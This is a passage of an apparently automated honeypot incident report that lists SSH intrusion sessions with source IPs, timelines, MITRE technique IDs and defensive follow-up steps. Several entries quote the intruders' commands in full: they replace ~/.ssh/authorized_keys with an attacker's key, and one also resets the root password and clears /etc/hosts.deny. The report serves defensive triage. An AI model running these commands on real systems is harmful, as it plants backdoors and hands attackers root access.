| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:B5S88n0O44RS"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:39:44` | `cowrie.session.connect` |
| `2026-04-29 14:39:44` | `cowrie.client.version` |
| `2026-04-29 14:39:44` | `cowrie.client.kex` |
| `2026-04-29 14:39:45` | `cowrie.login.success` |
| `2026-04-29 14:39:45` | `cowrie.session.params` |
| `2026-04-29 14:39:45` | `cowrie.command.input` |
| `2026-04-29 14:39:45` | `cowrie.command.failed` |
| `2026-04-29 14:39:45` | `cowrie.log.closed` |
| `2026-04-29 14:39:45` | `cowrie.session.params` |
| `2026-04-29 14:39:45` | `cowrie.command.input` |
| `2026-04-29 14:39:45` | `cowrie.session.file_download` |
| `2026-04-29 14:39:45` | `cowrie.log.closed` |
| `2026-04-29 14:39:53` | `cowrie.session.params` |
| `2026-04-29 14:39:53` | `cowrie.command.input` |
| `2026-04-29 14:39:53` | `cowrie.log.closed` |
| `2026-04-29 14:39:54` | `cowrie.session.params` |
| `2026-04-29 14:39:54` | `cowrie.command.input` |
| `2026-04-29 14:39:54` | `cowrie.log.closed` |
| `2026-04-29 14:39:54` | `cowrie.session.params` |
| `2026-04-29 14:39:54` | `cowrie.command.input` |
| `2026-04-29 14:39:54` | `cowrie.session.file_download` |
| `2026-04-29 14:39:54` | `cowrie.log.closed` |
| `2026-04-29 14:39:54` | `cowrie.session.params` |
| `2026-04-29 14:39:54` | `cowrie.command.input` |
| `2026-04-29 14:39:54` | `cowrie.log.closed` |
| `2026-04-29 14:39:55` | `cowrie.session.params` |
| `2026-04-29 14:39:55` | `cowrie.command.input` |
| `2026-04-29 14:39:55` | `cowrie.log.closed` |
| `2026-04-29 14:39:55` | `cowrie.session.params` |
| `2026-04-29 14:39:55` | `cowrie.command.input` |
| `2026-04-29 14:39:55` | `cowrie.command.input` |
| `2026-04-29 14:39:55` | `cowrie.log.closed` |
| `2026-04-29 14:39:55` | `cowrie.session.params` |
| `2026-04-29 14:39:55` | `cowrie.command.input` |
| `2026-04-29 14:39:55` | `cowrie.log.closed` |
| `2026-04-29 14:39:56` | `cowrie.session.params` |
| `2026-04-29 14:39:56` | `cowrie.command.input` |
| `2026-04-29 14:39:56` | `cowrie.log.closed` |
| `2026-04-29 14:39:56` | `cowrie.session.params` |
| `2026-04-29 14:39:56` | `cowrie.command.input` |
| `2026-04-29 14:39:56` | `cowrie.log.closed` |
| `2026-04-29 14:39:56` | `cowrie.session.params` |
| `2026-04-29 14:39:56` | `cowrie.command.input` |
| `2026-04-29 14:39:56` | `cowrie.log.closed` |
| `2026-04-29 14:39:57` | `cowrie.session.params` |
| `2026-04-29 14:39:57` | `cowrie.command.input` |
| `2026-04-29 14:39:57` | `cowrie.log.closed` |
| `2026-04-29 14:39:57` | `cowrie.session.params` |
| `2026-04-29 14:39:57` | `cowrie.command.input` |
| `2026-04-29 14:39:57` | `cowrie.log.closed` |
| `2026-04-29 14:39:57` | `cowrie.session.params` |
| `2026-04-29 14:39:57` | `cowrie.command.input` |
| `2026-04-29 14:39:57` | `cowrie.log.closed` |
| `2026-04-29 14:39:58` | `cowrie.session.params` |
| `2026-04-29 14:39:58` | `cowrie.command.input` |
| `2026-04-29 14:39:58` | `cowrie.log.closed` |
| `2026-04-29 14:39:58` | `cowrie.session.params` |
| `2026-04-29 14:39:58` | `cowrie.command.input` |
| `2026-04-29 14:39:58` | `cowrie.log.closed` |
| `2026-04-29 14:39:58` | `cowrie.session.params` |
| `2026-04-29 14:39:58` | `cowrie.command.input` |
| `2026-04-29 14:39:59` | `cowrie.log.closed` |
| `2026-04-29 14:39:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3d676a5852b

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]208` |
| **First Seen** | 2026-04-29 16:23 |
| **Last Seen** | 2026-04-29 16:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 16:23:59` | `cowrie.session.connect` |
| `2026-04-29 16:23:59` | `cowrie.client.version` |
| `2026-04-29 16:23:59` | `cowrie.client.kex` |
| `2026-04-29 16:23:59` | `cowrie.login.success` |
| `2026-04-29 16:24:00` | `cowrie.session.params` |
| `2026-04-29 16:24:00` | `cowrie.command.input` |
| `2026-04-29 16:24:00` | `cowrie.command.failed` |
| `2026-04-29 16:24:00` | `cowrie.log.closed` |
| `2026-04-29 16:24:00` | `cowrie.session.params` |
| `2026-04-29 16:24:00` | `cowrie.command.input` |
| `2026-04-29 16:24:00` | `cowrie.session.file_download` |
| `2026-04-29 16:24:00` | `cowrie.log.closed` |
| `2026-04-29 16:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]208` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-294ef13f75ef

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]208` |
| **First Seen** | 2026-04-29 16:24 |
| **Last Seen** | 2026-04-29 16:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 16:24:02` | `cowrie.session.connect` |
| `2026-04-29 16:24:02` | `cowrie.client.version` |
| `2026-04-29 16:24:02` | `cowrie.client.kex` |
| `2026-04-29 16:24:03` | `cowrie.login.success` |
| `2026-04-29 16:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]208` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b569c7318be2

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]208` |
| **First Seen** | 2026-04-29 16:31 |
| **Last Seen** | 2026-04-29 16:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 16:31:09` | `cowrie.session.connect` |
| `2026-04-29 16:31:09` | `cowrie.client.version` |
| `2026-04-29 16:31:09` | `cowrie.client.kex` |
| `2026-04-29 16:31:10` | `cowrie.login.success` |
| `2026-04-29 16:31:10` | `cowrie.session.params` |
| `2026-04-29 16:31:10` | `cowrie.command.input` |
| `2026-04-29 16:31:10` | `cowrie.command.failed` |
| `2026-04-29 16:31:10` | `cowrie.log.closed` |
| `2026-04-29 16:31:10` | `cowrie.session.params` |
| `2026-04-29 16:31:10` | `cowrie.command.input` |
| `2026-04-29 16:31:10` | `cowrie.session.file_download` |
| `2026-04-29 16:31:10` | `cowrie.log.closed` |
| `2026-04-29 16:31:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]208` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65227bc3206b

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]208` |
| **First Seen** | 2026-04-29 16:31 |
| **Last Seen** | 2026-04-29 16:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 16:31:12` | `cowrie.session.connect` |
| `2026-04-29 16:31:12` | `cowrie.client.version` |
| `2026-04-29 16:31:12` | `cowrie.client.kex` |
| `2026-04-29 16:31:13` | `cowrie.login.success` |
| `2026-04-29 16:31:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]208` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17fed8238373

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]208` |
| **First Seen** | 2026-04-29 16:32 |
| **Last Seen** | 2026-04-29 16:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 16:32:03` | `cowrie.session.connect` |
| `2026-04-29 16:32:03` | `cowrie.client.version` |
| `2026-04-29 16:32:03` | `cowrie.client.kex` |
| `2026-04-29 16:32:04` | `cowrie.login.success` |
| `2026-04-29 16:32:04` | `cowrie.session.params` |
| `2026-04-29 16:32:04` | `cowrie.command.input` |
| `2026-04-29 16:32:04` | `cowrie.command.failed` |
| `2026-04-29 16:32:04` | `cowrie.log.closed` |
| `2026-04-29 16:32:05` | `cowrie.session.params` |
| `2026-04-29 16:32:05` | `cowrie.command.input` |
| `2026-04-29 16:32:05` | `cowrie.session.file_download` |
| `2026-04-29 16:32:05` | `cowrie.log.closed` |
| `2026-04-29 16:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]208` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f266ec93d09e

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]208` |
| **First Seen** | 2026-04-29 16:32 |
| **Last Seen** | 2026-04-29 16:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 16:32:06` | `cowrie.session.connect` |
| `2026-04-29 16:32:06` | `cowrie.client.version` |
| `2026-04-29 16:32:07` | `cowrie.client.kex` |
| `2026-04-29 16:32:07` | `cowrie.login.success` |
| `2026-04-29 16:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]208` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73474d0bc7b5

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]208` |
| **First Seen** | 2026-04-29 16:33 |
| **Last Seen** | 2026-04-29 16:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 16:33:58` | `cowrie.session.connect` |
| `2026-04-29 16:33:58` | `cowrie.client.version` |
| `2026-04-29 16:33:58` | `cowrie.client.kex` |
| `2026-04-29 16:33:59` | `cowrie.login.success` |
| `2026-04-29 16:33:59` | `cowrie.session.params` |
| `2026-04-29 16:33:59` | `cowrie.command.input` |
| `2026-04-29 16:33:59` | `cowrie.command.failed` |
| `2026-04-29 16:33:59` | `cowrie.log.closed` |
| `2026-04-29 16:33:59` | `cowrie.session.params` |
| `2026-04-29 16:33:59` | `cowrie.command.input` |
| `2026-04-29 16:33:59` | `cowrie.session.file_download` |
| `2026-04-29 16:33:59` | `cowrie.log.closed` |
| `2026-04-29 16:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]208` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd7462727576

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]208` |
| **First Seen** | 2026-04-29 16:34 |
| **Last Seen** | 2026-04-29 16:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 16:34:01` | `cowrie.session.connect` |
| `2026-04-29 16:34:01` | `cowrie.client.version` |
| `2026-04-29 16:34:01` | `cowrie.client.kex` |
| `2026-04-29 16:34:02` | `cowrie.login.success` |
| `2026-04-29 16:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]208` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-779e4885069a

| Field | Detail |
|---|---|
| **Source IP** | `165.154.5[.]249` |
| **First Seen** | 2026-04-29 16:49 |
| **Last Seen** | 2026-04-29 16:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 16:49:04` | `cowrie.session.connect` |
| `2026-04-29 16:49:04` | `cowrie.client.version` |
| `2026-04-29 16:49:04` | `cowrie.client.kex` |
| `2026-04-29 16:49:04` | `cowrie.login.success` |
| `2026-04-29 16:49:04` | `cowrie.session.params` |
| `2026-04-29 16:49:04` | `cowrie.command.input` |
| `2026-04-29 16:49:04` | `cowrie.command.failed` |
| `2026-04-29 16:49:04` | `cowrie.log.closed` |
| `2026-04-29 16:49:05` | `cowrie.session.params` |
| `2026-04-29 16:49:05` | `cowrie.command.input` |
| `2026-04-29 16:49:05` | `cowrie.session.file_download` |
| `2026-04-29 16:49:05` | `cowrie.log.closed` |
| `2026-04-29 16:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.5[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.154.5[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d4f60adfbea

| Field | Detail |
|---|---|
| **Source IP** | `165.154.5[.]249` |
| **First Seen** | 2026-04-29 16:49 |
| **Last Seen** | 2026-04-29 16:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 16:49:07` | `cowrie.session.connect` |
| `2026-04-29 16:49:07` | `cowrie.client.version` |
| `2026-04-29 16:49:07` | `cowrie.client.kex` |
| `2026-04-29 16:49:07` | `cowrie.login.success` |
| `2026-04-29 16:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.5[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.154.5[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3ae3c4c7316

| Field | Detail |
|---|---|
| **Source IP** | `165.154.5[.]249` |
| **First Seen** | 2026-04-29 17:01 |
| **Last Seen** | 2026-04-29 17:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 17:01:49` | `cowrie.session.connect` |
| `2026-04-29 17:01:49` | `cowrie.client.version` |
| `2026-04-29 17:01:49` | `cowrie.client.kex` |
| `2026-04-29 17:01:49` | `cowrie.login.success` |
| `2026-04-29 17:01:49` | `cowrie.session.params` |
| `2026-04-29 17:01:49` | `cowrie.command.input` |
| `2026-04-29 17:01:49` | `cowrie.command.failed` |
| `2026-04-29 17:01:49` | `cowrie.log.closed` |
| `2026-04-29 17:01:50` | `cowrie.session.params` |
| `2026-04-29 17:01:50` | `cowrie.command.input` |
| `2026-04-29 17:01:50` | `cowrie.session.file_download` |
| `2026-04-29 17:01:50` | `cowrie.log.closed` |
| `2026-04-29 17:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.5[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.154.5[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96c30bded934

| Field | Detail |
|---|---|
| **Source IP** | `165.154.5[.]249` |
| **First Seen** | 2026-04-29 17:01 |
| **Last Seen** | 2026-04-29 17:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 17:01:52` | `cowrie.session.connect` |
| `2026-04-29 17:01:52` | `cowrie.client.version` |
| `2026-04-29 17:01:52` | `cowrie.client.kex` |
| `2026-04-29 17:01:52` | `cowrie.login.success` |
| `2026-04-29 17:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.5[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.154.5[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b18f8604f65

| Field | Detail |
|---|---|
| **Source IP** | `165.154.5[.]249` |
| **First Seen** | 2026-04-29 17:02 |
| **Last Seen** | 2026-04-29 17:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 17:02:42` | `cowrie.session.connect` |
| `2026-04-29 17:02:42` | `cowrie.client.version` |
| `2026-04-29 17:02:42` | `cowrie.client.kex` |
| `2026-04-29 17:02:43` | `cowrie.login.success` |
| `2026-04-29 17:02:43` | `cowrie.session.params` |
| `2026-04-29 17:02:43` | `cowrie.command.input` |
| `2026-04-29 17:02:43` | `cowrie.command.failed` |
| `2026-04-29 17:02:43` | `cowrie.log.closed` |
| `2026-04-29 17:02:43` | `cowrie.session.params` |
| `2026-04-29 17:02:43` | `cowrie.command.input` |
| `2026-04-29 17:02:43` | `cowrie.session.file_download` |
| `2026-04-29 17:02:43` | `cowrie.log.closed` |
| `2026-04-29 17:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.5[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.154.5[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a26b3ed24754

| Field | Detail |
|---|---|
| **Source IP** | `165.154.5[.]249` |
| **First Seen** | 2026-04-29 17:02 |
| **Last Seen** | 2026-04-29 17:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 17:02:45` | `cowrie.session.connect` |
